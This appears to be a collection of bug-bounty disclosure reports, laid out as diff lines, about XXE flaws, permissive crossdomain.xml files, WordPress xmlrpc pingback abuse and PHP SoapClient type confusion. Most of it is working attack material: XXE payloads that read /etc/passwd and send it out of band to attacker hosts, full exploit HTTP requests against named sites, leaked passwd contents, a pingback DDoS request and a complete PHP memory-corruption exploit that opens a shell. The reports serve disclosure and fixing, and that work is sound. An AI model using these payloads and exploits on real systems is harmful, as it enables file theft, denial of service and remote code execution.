vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BPGRzOlNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNyc2Etc2hhMSIvPjxkczpSZWZlcmVuY2UgVVJJPSIjaWQyOTA5ODg2NzYyNzQ3NjQxMzUwNDEzNDk3MiI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyI%2BPGVjOkluY2x1c2l2ZU5hbWVzcGFjZXMgeG1sbnM6ZWM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIgUHJlZml4TGlzdD0ieHMiLz48L2RzOlRyYW5zZm9ybT48L2RzOlRyYW5zZm9ybXM%2BPGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNzaGExIi8%2BPGRzOkRpZ2VzdFZhbHVlPnYzMDhxcFZNZ3k0cTNIVk5BMmgyTmxzREE0OD08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU%2BUE5HMUllTXI2MGlkSUkvNFIrcWhSNXFzVUZVM05NYkRzOUFtTzdIZ0U2UFprMFg0VnJlbHJPTjRZeXkwdzY0dUhnQjUvQUpyRTREZ1YyOVV1Vi9NSmg4ZVByK1pRUlpRR09nZFphZTljcGM5VHBYZVRsWVF1T2dleVcyM25HZDRLeHBtK0ZkVU1aaldTY0pYditrYjQrQ2Q5eElmKzRCTDE5MnJ5elBEc1cwPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJQ296Q0NBZ3lnQXdJQkFnSUdBVDN3UmxIdE1BMEdDU3FHU0liM0RRRUJCUVVBTUlHVU1Rc3dDUVlEVlFRR0V3SlZVekVUTUJFRwpBMVVFQ0F3S1EyRnNhV1p2Y201cFlURVdNQlFHQTFVRUJ3d05VMkZ1SUVaeVlXNWphWE5qYnpFTk1Bc0dBMVVFQ2d3RVQydDBZVEVVCk1CSUdBMVVFQ3d3TFUxTlBVSEp2ZG1sa1pYSXhGVEFUQmdOVkJBTU1ER2x1Wm1Gd1lYTnpjRzl5ZERFY01Cb0dDU3FHU0liM0RRRUoKQVJZTmFXNW1iMEJ2YTNSaExtTnZiVEFlRncweE16QTBNRGt4T1RJNE16TmFGdzAwTXpBME1Ea3hPVEk1TXpOYU1JR1VNUXN3Q1FZRApWUVFHRXdKVlV6RVRNQkVHQTFVRUNBd0tRMkZzYVdadmNtNXBZVEVXTUJRR0ExVUVCd3dOVTJGdUlFWnlZVzVqYVhOamJ6RU5NQXNHCkExVUVDZ3dFVDJ0MFlURVVNQklHQTFVRUN3d0xVMU5QVUhKdmRtbGtaWEl4RlRBVEJnTlZCQU1NREdsdVptRndZWE56Y0c5eWRERWMKTUJvR0NTcUdTSWIzRFFFSkFSWU5hVzVtYjBCdmEzUmhMbU52YlRDQm56QU5CZ2txaGtpRzl3MEJBUUVGQUFPQmpRQXdnWWtDZ1lFQQprOFUyUnY1S2lmMzE2aVFkRWVaU25JY3d4amNNRDkzcUpRL1BQbkJDc1A4MDFkbThEOGxxbHBmcHg0Mk82SkxwR0pycSt6UExhZURiCmo1TFJqak9GQjFWR3Z4dEM2eGlpY3o2SXZTS1FVQXFxOCtpL2hsU293SU5zdS9TOWswd0hDaEplVi9tYnBMbVRWeXRRSlYrdVNRM1QKemdjcTNWQzU5VXR2djNFNUJ4OENBd0VBQVRBTkJna3Foa2lHOXcwQkFRVUZBQU9CZ1FBKzBITi9sSkduTWd4SWVwVGJ4LzZqYjNhWQpPNWpyK3IraWFvL1BwL1dlNkxTL2t5MkovdkpGSnZ5TjNMcjBKcFVaeW4zQUZUc3Y4ZFNURmxjeTN2blZBUjdkdnhaY1dHTGlwbzRECm5ZQ3NGNmYvcFgwRDFHSmgyaUZxL3ArK0dqbldIRzZ0Z3ZkUm93akdqVkM3MTFrTy9rUHJIa1ZleDFTNGhlUkxCUVM2Mnc9PTwvZHM6WDUwOUNlcnRpZmljYXRlPjwvZHM6WDUwOURhdGE%2BPC9kczpLZXlJbmZvPjwvZHM6U2lnbmF0dXJlPjxzYW1sMjpTdWJqZWN0IHhtbG5zOnNhbWwyPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj48c2FtbDI6TmFtZUlEIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6MS4xOm5hbWVpZC1mb3JtYXQ6ZW1haWxBZGRyZXNzIj55YXJiYWJpbkBnbWFpbC5jb208L3NhbWwyOk5hbWVJRD48c2FtbDI6U3ViamVjdENvbmZpcm1hdGlvbiBNZXRob2Q9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjbTpiZWFyZXIiPjxzYW1sMjpTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBOb3RPbk9yQWZ0ZXI9IjIwMTUtMTItMjVUMTI6NTM6MzAuNjczWiIgUmVjaXBpZW50PSJodHRwczovL3Jldi1hcHAuaW5mb3JtYXRpY2EuY29tL3NzbyIvPjwvc2FtbDI6U3ViamVjdENvbmZpcm1hdGlvbj48L3NhbWwyOlN1YmplY3Q%2BPHNhbWwyOkNvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDE1LTEyLTI1VDEyOjQzOjMwLjY3M1oiIE5vdE9uT3JBZnRlcj0iMjAxNS0xMi0yNVQxMjo1MzozMC42NzNaIiB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BPHNhbWwyOkF1ZGllbmNlUmVzdHJpY3Rpb24%2BPHNhbWwyOkF1ZGllbmNlPmh0dHBzOi8vcmV2LWFwcC5pbmZvcm1hdGljYS5jb20vc3NvPC9zYW1sMjpBdWRpZW5jZT48L3NhbWwyOkF1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9zYW1sMjpDb25kaXRpb25zPjxzYW1sMjpBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMTUtMTItMjVUMTI6NDg6MzAuNjcyWiIgU2Vzc2lvbkluZGV4PSJpZDE0NTEwNDc3MTA2NzIuNjQ0NjAwMjU2IiB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BPHNhbWwyOkF1dGhuQ29udGV4dD48c2FtbDI6QXV0aG5Db250ZXh0Q2xhc3NSZWY%2BdXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmRQcm90ZWN0ZWRUcmFuc3BvcnQ8L3NhbWwyOkF1dGhuQ29udGV4dENsYXNzUmVmPjwvc2FtbDI6QXV0aG5Db250ZXh0Pjwvc2FtbDI6QXV0aG5TdGF0ZW1lbnQ%2BPHNhbWwyOkF0dHJpYnV0ZVN0YXRlbWVudCB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiI%2BPHNhbWwyOkF0dHJpYnV0ZSBOYW1lPSJSb2xlIiBOYW1lRm9ybWF0PSJucyI%2BPHNhbWwyOkF0dHJpYnV0ZVZhbHVlIHhtbG5zOnhzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYSIgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIgeHNpOnR5cGU9InhzOnN0cmluZyI%2BYWxsPC9zYW1sMjpBdHRyaWJ1dGVWYWx1ZT48L3NhbWwyOkF0dHJpYnV0ZT48L3NhbWwyOkF0dHJpYnV0ZVN0YXRlbWVudD48L3NhbWwyOkFzc2VydGlvbj48L3NhbWwycDpSZXNwb25zZT4%3D&RelayState=`
+
+Where SAMLResponse XML in base64 with XXE payload:
+`<!DOCTYPE foo [ <!ENTITY % asd SYSTEM "http://evilhost"> %asd;]>`
+
+===== XXE-106797 | [marketplace.informatica.com] - XXE | resolved | sev=high | bounty=None | weakness=Command Injection - Generic
+Request:
+`POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1`
+`Host: marketplace.informatica.com`
+`Connection: keep-alive`
+`Content-Length: 140`
+`Accept: */*`
+`X-J-Token: no-user`
+`X-Requested-With: XMLHttpRequest`
+`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`
+`Origin: https://marketplace.informatica.com`
+`Content-Type: application/json`
+`Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa`
+`Accept-Encoding: gzip, deflate`
+`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`
+
+`{"params":{"source":"marketplace","rows":5,"offset":0,"queryParams":{"query":"lol","fieldList":"[\"id\", \"title\"]","sortBy":"relevance"}}}`
+
+But, if we change content-type to application/xml and convert JSON to XML:
+`POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1`
+`Host: marketplace.informatica.com`
+`Connection: keep-alive`
+`Content-Length: 350`
+`Accept: */*`
+`X-J-Token: no-user`
+`X-Requested-With: XMLHttpRequest`
+`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`
+`Origin: https://marketplace.informatica.com`
+`Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa`
+`Accept-Encoding: gzip, deflate`
+`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`
+`Content-Type: application/xml;charset=UTF-8`
+
+`<?xml version="1.0" encoding="UTF-8" standalone="no"?>`
+`<!DOCTYPE foo [  `
+`<!ELEMENT foo ANY >`
+`<!ENTITY xxe SYSTEM "file:///etc/passwd1" >]>`
+`<params>`
+`<offset>0</offset>`
+`<queryParams>`
+`<query>&xxe;</query>`
+`<sortBy>relevance</sortBy>`
+`<fieldList>["id", "title"]</fieldList>`
+`</queryParams>`
+`<source>marketplace</source>`
+`<rows>5</rows>`
+`</params>`
+
+I get response: `JAXBException occurred : /etc/passwd1 (No such file or directory). /etc/passwd1 (No such file or directory). `
+
+Then, i try to get /etc/passwd with OOB vector:
+`POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1`
+`Host: marketplace.informatica.com`
+`Connection: keep-alive`
+`Content-Length: 350`
+`Accept: */*`
+`X-J-Token: no-user`
+`X-Requested-With: XMLHttpRequest`
+`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`
+`Origin: https://marketplace.informatica.com`
+`Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa`
+`Accept-Encoding: gzip, deflate`
+`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`
+`Content-Type: application/xml;charset=UTF-8`
+
+`<?xml version="1.0" encoding="UTF-8" standalone="no"?>`
+`<!DOCTYPE foo [  `
+`<!ENTITY % b SYSTEM "file:///etc/passwd">`
+`<!ENTITY % asd SYSTEM "http://evilhost/xx.html">  %asd;  %rrr;]>`
+`<params>`
+`<offset>0</offset>`
+`<queryParams>`
+`<query>&xxe;</query>`
+`<sortBy>relevance</sortBy>`
+`<fieldList>["id", "title"]</fieldList>`
+`</queryParams>`
+`<source>marketplace</source>`
+`<rows>5</rows>`
+`</params>`
+
+And I got it :) 
+
+===== XXE-105980 | XXE at host vpn.owncloud.com | resolved | sev=None | bounty=None | weakness=Command Injection - Generic
+Improper XML parser configuration provide attacker to read arbitrary files and make HTTP requests from server side.
+
+Exploit example is listed below:
+```
+POST /user/login HTTP/1.1
+Host: 144.76.105.208
+Accept: */*
+Content-type: application/xml
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Length: 163
+
+<?xml version="1.0"?>
+<!DOCTYPE a [
+<!ENTITY % select SYSTEM "http://wallarm.tools/ok">
+%select;
+]>
+<a>wlrm-scnr</a>
+```
+
+From access.log on this server:
+2a01:4f8:192:50d6::2 - - [18/Dec/2015:21:11:47 +0300] "GET /ok HTTP/1.0" 200 227 "-" "-"
+
+===== XXE-105787 |  XXE in upload file feature | resolved | sev=high | bounty=None | weakness=Uncontrolled Resource Consumption
+<<NO BODY — metadata only>>
+
+--- SUMMARY (team): The attacker was able to execute XXE in one of the file upload feature. 
+
+
+===== XXE-105753 | [app.informaticaondemand.com] XXE | resolved | sev=high | bounty=None | weakness=Uncontrolled Resource Consumption
+Request:
+POST /ma/api/v2/user/login HTTP/1.1
+Host: app.informaticaondemand.com
+Content-Length: 285
+Content-Type: application/xml
+Accept: application/xml
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE root [
+<!ENTITY % b PUBLIC "lol" "file:///etc/passwd">
+<!ENTITY % asd PUBLIC "lol" "http://mysite/xx.html">
+%asd;
+%rrr;]>
+<login><username>[REDACTED_EMAIL]</username><password>Infa123</password></login>
+
+Where xx.html:
+<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://mysite/%b;'>">%c;
+
+Then i got file /etc/passwd (xxe_app.png)
+
+
+===== XXE-105463 | risk of having secure=false in a crossdomain.xml | resolved | sev=None | bounty=None | weakness=Memory Corruption - Generic
+api.imgur.com permits SWF files on a non-HTTPS server to load data from this HTTPS server. Setting the secure attribute to false could compromise the security offered by HTTPS. In particular, setting this attribute to false opens secure content to snooping and spoofing attacks.
+
+The allow-access-from node has an optional attribute 'secure'. So say the crossdomain.xml on api.imgur.com has : 
+
+<allow-access-from domain="imgur.com" secure="false"/>
+<allow-access-from domain="*.imgur.com" secure="false"/>
+<allow-access-from domain="*.imgur-dev.com" secure="false"/>
+
+If this is set to true (default), a flash client retrieved over HTTP cannot access data on the ideanetsetter.yahoo.com over HTTPS.
+
+I can only think of one risk in setting secure to false: A user with a poisoned host file or DNS server might be diverted to a flash client on a fake http://subdomain.example.com.
+This flash client can now access sensitive data on api.imgur.com 
+
+
+Good Fix ,
+
+===== XXE-105434 | [rev-app.informatica.com] - XXE | resolved | sev=high | bounty=None | weakness=Uncontrolled Resource Consumption
+1. Open file xxe.xlsx like zip-archive
+2. Read file xxe.xlsx\xl\worksheets\sheet1.xml
+
+In file I wrote XXE payload:
+<!DOCTYPE foo [  <!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "lol" "file:///etc/passwd" >]>
+Then, i went to https://rev-app.informatica.com and made new project and imported my XLSX-file
+
+When it was impoted i see /etc/passwd file:
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+abrt:x:173:173::/etc/abrt:/sbin/nologin
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+oprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin
+ec2-user:x:500:500::/home/ec2-user:/bin/bash
+scom:x:501:501::/home/scom:/bin/bash
+nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
+nslcd:x:65:55:LDAP Client User:/:/sbin/nologin
+dataprep:x:504:505::/home2/dataprep:/bin/bash
+zabbix:x:498:506::/home/zabbix:/bin/bash
+
+Video (private): https://youtu.be/612SgFdOrB0
+
+===== XXE-104620 | XXE in OAuth2 Applications gallery profile App logo | informative | sev=None | bounty=None | weakness=None
+upload svg photo (XML based) as App logo contain XML payload renamed to .jpg server start execute this XML payload
+or just watch this video "https://www.dropbox.com/s/wkba6f0wrax0wr8/xxe.mp4?dl=0"
+
+the same vulnerability was in https://www.coinbase.com/careers and reported by https://hackerone.com/mohaab007 one year ago "https://www.youtube.com/watch?v=qzbafFSFhtU"
+
+===== XXE-104010 | SOAP serialize_function_call() type confusion / RCE | resolved | sev=None | bounty=None | weakness=None
+https://bugs.php.net/bug.php?id=70388
+
+===== XXE-104000 | Python xmlparse_setattro() Type Confusion | resolved | sev=None | bounty=500.0 | weakness=None
+http://bugs.python.org/issue25019
+
+===== XXE-96662 | crossdomain.xml too permissive on eu1.badoo.com, us1.badoo.com, etc. | resolved | sev=None | bounty=None | weakness=Violation of Secure Design Principles
+__Description__
+
+The file _crossdomain.xml_ that is hosted at https://[eu1,us1,etc].badoo.com/crossdomain.xml is too permissive in the scope of allowed domains to access the content in the domain using Flash.
+When you contact Badoo via https://us1.badoo.com/feedback/, you can upload a file. This file can be a Flash file. This file is hosted at https://static-*.badoo.com which is an allowed domain because of the line `<allow-access-from domain="*.badoo.com"/>` in the _crossdomain.xml_ file.
+The problem is that an attacker can upload a malicious Flash file and load it from an external website. This allows to read and update information of the current logged in user.
+
+__Proof of concept__
+
+1. Download the file _bug.jpg_ that I attached (the source code is attached too).
+2. Go to https://us1.badoo.com/feedback/.
+3. Click on _General question_.
+4. Fill the required fields.
+5. Click _Attach screenshot_.
+6. Select the file you downloaded in step 1 and click _Open_.
+7. When the upload is finished, click _Send message_.
+8. Go to the inbox of the email address that you entered for _Email address_.
+9. Open the email with the subject "We've received your query", sent by Badoo Support Team.
+10. Click on the link that appears (like: https://us1.badoo.com/support.phtml?rid=11761766:noX7xh7DgCDiU80B).
+11. Click on the name of the file that you uploaded (_bug.jpg_). Appears below the message you wrote.
+12. Right click on the black box that is shown, and find the `<img alt="" class="pv-big" id="big_photo">` element.
+13. Save the `src` value of the element (it looks like https://static-us2.badoo.com/file/36140042.0?signature=41918aa731579d62a601d6391ac793f1&amp;dt=9tKskfyuTrlkjvLg).
+14. Download the file _bug.html_ that I attached.
+15. Open the file _bug.html_ in a text editor. Change the value of the attribute `src` of the element `<embed>` to the value that you saved in step 13.
+16. Serve the file _bug.html_ from a server (can be local, like `php -S 0.0.0.0:8000`).
+17. Verify that you are logged in Badoo.
+18. Open the file _bug.html_ from the server using the web browser (like http://localhost:8000/bug.html).
+19. The content of the endpoint https://us1.badoo.com/settings is showed in the `<textarea>`.
+
+This is a simple proof of concept, but it's possible to make POST requests too.
+
+Let me know if something is not well explained.
+
+===== XXE-96294 | DDOS using xmlrpc.php | resolved | sev=None | bounty=None | weakness=Uncontrolled Resource Consumption
+Wordpress blogs that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The blog at withinsecurity.com has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.
+
+* In order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp, send the request below. See screenshot 1: 
+
+```
+POST /xmlrpc.php HTTP/1.1 
+Host: withinsecurity.com 
+Connection: keep-alive 
+Content-Length: 175
+
+<?xml version="1.0" encoding="utf-8"?> 
+<methodCall> 
+<methodName>demo.sayHello</methodName> 
+<params> 
+<param>
+<value>admin</value>
+</param> 
+</params> 
+</methodCall>
+```
+
+* Notice that a successful response is received showing that the xmlrpc.php file is enabled. 
+
+* Now, considering the blog post `https://withinsecurity.com/2015/10/is-there-really-a-cybersecurity-skills-gap/` on the withinsecurity.com domain, the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below. See Screenshot 2: 
+
+```
+POST /xmlrpc.php HTTP/1.1 
+Host: withinsecurity.com 
+Connection: keep-alive 
+Content-Length: 293
+
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param>
+<value><string>http://173.243.56.36/</string></value>
+</param>
+<param>
+<value><string>https://withinsecurity.com/2015/10/is-there-really-a-cybersecurity-skills-gap/</string></value>
+</param>
+</params>
+</methodCall>
+```
+
+* As soon as the above request is sent, the victim host (173.243.56.36) gets an entry in its log file with a request originating from the withinsecurity.com domain verifying the pingback. See screenshot 3.
+
+This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim. 
+
+===== XXE-91604 | Crossdomain.xml settings on api.imgur.com too open | resolved | sev=None | bounty=None | weakness=Memory Corruption - Generic
+<<NO BODY — metadata only>>
+
+--- SUMMARY (team): The crossdomain.xml file hosted at http://api.imgur.com/crossdomain.xml was too open. This allowed SWF files to make HTTP requests and see it's response. If this was not changed, then attacker.com can embed a SWF on attacker.com/example.html that makes an HTTP request to http://api.imgur.com/. The result page for http://api.imgur.com/ would include the CSRF token and the SWF file could make requests with the user's cookies.
+
+
+===== XXE-73245 | Type Confusion Vulnerability in SoapClient | resolved | sev=None | bounty=None | weakness=None
+# Type Confusion Vulnerability in SoapClient
+
+Taoguang Chen <[ () chtg](http://github.com/chtg)> - Write Date: 2015.3.1
+- Release Date: 2015.3.20
+
+A type confusion vulnerability was discovered in SoapClient object's __getCookies() method that can be abused for 
+leaking arbitrary memory blocks or execute arbitrary code remotely.
+
+Affected Versions
+------------
+Affected is PHP 5.6 < 5.6.7
+Affected is PHP 5.5 < 5.5.23
+Affected is PHP 5.4 < 5.4.39
+Affected is PHP 5.3 <= 5.3.29
+
+Credits
+------------
+This vulnerability was disclosed by Taoguang Chen.
+
+Description
+------------
+```
+PHP_METHOD(SoapClient, __getCookies)
+{
+        zval **cookies, *tmp;
+
+        if (zend_parse_parameters_none() == FAILURE) {
+                return;
+        }
+
+        array_init(return_value);
+
+        if (zend_hash_find(Z_OBJPROP_P(this_ptr), "_cookies",
+sizeof("_cookies"), (void **)&cookies) != FAILURE) {
+                zend_hash_copy(Z_ARRVAL_P(return_value), Z_ARRVAL_P(*cookies),
+(copy_ctor_func_t) zval_add_ref, (void *)&tmp, sizeof(zval*));
+        }
+}
+```
+
+The Z_ARRVAL_P macro leads to pointing a fake array-type ZVAL in
+memory via a fake HashTable and a fake Bucket. This should result in
+arbitrary code execution.
+
+Proof of Concept Exploit
+------------
+The PoC works on standard MacOSX 10.10.3 installation of PHP 5.5.14.
+
+```
+<?php
+
+ini_set("memory_limit", -1);
+
+if ($_SERVER['argc'] < 2) {
+        $_SERVER['argv'][1] = 'system(sh);exit;';
+}
+
+setup_memory();
+
+$exploit = 'O:10:"SoapClient":1:{s:8:"_cookies";s:'.strlen($hashtable).':"'.$hashtable.'";}';
+$z = unserialize($exploit);
+// $z = new SoapClient(null, array('location' => "", 'uri' => ""));
+// $z->_cookies = $hashtable;
+$z->__getCookies();
+
+function setup_memory()
+{
+        global $str, $hashtable;
+        
+        $base = 0x114000020;
+        $bucket_addr = $base;
+        $zval_delta = 0x100;
+        $hashtable_delta = 0x200;
+        $zval_addr = $base + $zval_delta;
+        $hashtable_addr = $base + $hashtable_delta;
+        $func_addr = 0x100351e3d; // zend_eval_string()'s address
+        
+        $bucket  = "\x01\x00\x00\x00\x00\x00\x00\x00";
+        $bucket .= "\x00\x00\x00\x00\x00\x00\x00\x00";
+        $bucket .= ptr2str($bucket_addr + 3*8);
+        $bucket .= ptr2str($zval_addr);
+        $bucket .= ptr2str(0);
+        $bucket .= ptr2str(0);
+        $bucket .= ptr2str(0);
+        $bucket .= ptr2str(0);
+        $bucket .= ptr2str(0);
+        
+        $hashtable  = "\x00\x00\x00\x00";
+        $hashtable .= "\x00\x00\x00\x00";
+        $hashtable .= "\x01\x00\x00\x00";
+        $hashtable .= "\x00\x00\x00\x00";
+        $hashtable .= "\x00\x00\x00\x00\x00\x00\x00\x00";
+        $hashtable .= ptr2str(0);
+        $hashtable .= ptr2str($bucket_addr);
+        $hashtable .= ptr2str(0);
+        $hashtable .= ptr2str(0);
+        $hashtable .= ptr2str(0);
+        $hashtable .= "\x00";
+        $hashtable .= "\x00";
+        
+        $zval = ptr2str($hashtable_addr);
+        $zval .= ptr2str(0);
+        $zval .= "\x00\x00\x00\x00";
+        $zval .= "\x04";
+        $zval .= "\x00";
+        $zval .= ptr2str(0);
+        $zval .= ptr2str(0);
+        $zval .= ptr2str(0);
+
+        $shellcode = ptr2str(0);
+        $shellcode .= ptr2str(0);
+        $shellcode .= ptr2str(0);
+        $shellcode .= ptr2str(0);
+        $shellcode .= ptr2str($hashtable_addr + 6*8);
+        $shellcode .= ptr2str(0);
+        $shellcode .= ptr2str(0);
+        $shellcode .= ptr2str($func_addr);
+        $shellcode .= ptr2str($hashtable_addr + 9*8);
+        $shellcode .= 
+"\x65\x76\x61\x6c\x28\x24\x5f\x53\x45\x52\x56\x45\x52\x5b\x27\x61\x72\x67\x76\x27\x5d\x5b\x31\x5d\x29\x3b\x00";
+// eval($_SERVER['argv'][1]);
+        
+        $part = str_repeat("\x73", 4096);
+        for ($j=0; $j<strlen($bucket); $j++) {
+                $part[$j] = $bucket[$j];
+        }
+        for ($j=0; $j<strlen($shellcode); $j++) {
+                $part[$j+$hashtable_delta] = $shellcode[$j];
+        }
+        for ($j=0; $j<strlen($zval); $j++) {
+                $part[$j+$zval_delta] = $zval[$j];
+        }
+        
+        $str = str_repeat($part, 1024*1024*256/4096);
+}
+
+function ptr2str($ptr)
+{
+        $out = "";
+        for ($i=0; $i<8; $i++) {
+                $out .= chr($ptr & 0xff);
+                $ptr >>= 8;
+        }
+        return $out;
+}
+
+?>
+```
+
+Test the PoC on the command line, then any PHP code can be executed:
+
+```
+$ lldb php
+(lldb) target create "php"
+Current executable set to 'php' (x86_64).
+(lldb) run tcpoc.php 'system\(sh\)\;exit\;'
+Process 2606 launched: '/usr/bin/php' (x86_64)
+sh: no job control in this shell
+sh-3.2$ php -v
+PHP 5.5.14 (cli) (built: Jan  8 2015 22:33:37)
+Copyright (c) 1997-2014 The PHP Group
+Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies
+sh-3.2$ exit
+exit
+Process 2606 exited with status = 0 (0x00000000)
+(lldb)
+```
+
+===== XXE-55431 | XML Parser Bug: XXE over which leads to RCE | resolved | sev=None | bounty=None | weakness=Code Injection
+Hello security team,
+
+I have reported this issue on Feb 6, 2015 and i'm resubmit it here again.
+I was able to do XXE attack on your site and exposed the /etc/passwd file.
+Scenario:
+1. Login to drchrono  site.
+2. Click on patients->patient
+3. Click on ' Update patient (via C-CDA XML).'
+4. Select the file I attached, (AXAX000001.xml), I download it from your site and added there struct for my exploit.
+5. Click on 'Preview' and you'll see the content of /etc/passwd, (That can be any file on the system or any command). See xxe.png atttachement.
+
+
+Best regards,
+Sasi
+
+===== XXE-55030 | SoapClient's __call() type confusion through unserialize() | resolved | sev=None | bounty=None | weakness=None
+https://bugs.php.net/bug.php?id=69085
+
+Description:
+------------
+SoapClient's __call() method is prone to a type confusion vulnerability which can be used to gain remote code execution through unsafe unserialize() calls.
+
+In soap.c:2906
+
+if (zend_hash_find(Z_OBJPROP_P(this_ptr), "__default_headers", sizeof("__default_headers"), (void **) &tmp)==SUCCESS) {
+       HashTable *default_headers = Z_ARRVAL_P(*tmp);
+
+the Z_ARRVAL_P macro is called on __default_headers assuming that it is an array without any actual check about it.
+
+It has been shown several times that this kind of vulnerability could lead to crash, arbitrary read/write memory access and code execution, so I'm not discussing about the actual exploitation of this one (you can refer to my previous submissions about natsort() and extract() if needed by the way).
+However, it's worth pointing out that given the nature of __call() magic method, any direct call on a user-controlled userialized input should be considered remotely exploitable.
+
+
+Test script:
+---------------
+<?php
+
+//tested on 64bit Ubuntu PHP 5.6.6
+//crash on memory access violation @1337
+
+$dummy = unserialize('O:10:"SoapClient":3:{s:3:"uri";s:1:"a";s:8:"location";s:22:"http://localhost/a.xml";s:17:"__default_headers";i:1337;}');
+var_dump($dummy->whatever());
+
+?>
+
+Actual result:
+--------------
+(gdb) r soapvar.php 
+Starting program: /usr/bin/php soapvar.php
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[New Thread 0x7fffec568700 (LWP 13984)]
+[Thread 0x7fffec568700 (LWP 13984) exited]
+
+Program received signal SIGSEGV, Segmentation fault.
+zend_hash_internal_pointer_reset_ex (ht=ht@entry=0x539, pos=pos@entry=0x0)
+    at /build/buildd/php5-5.6.3+dfsg/Zend/zend_hash.c:1020
+1020			*pos = ht->pListHead;
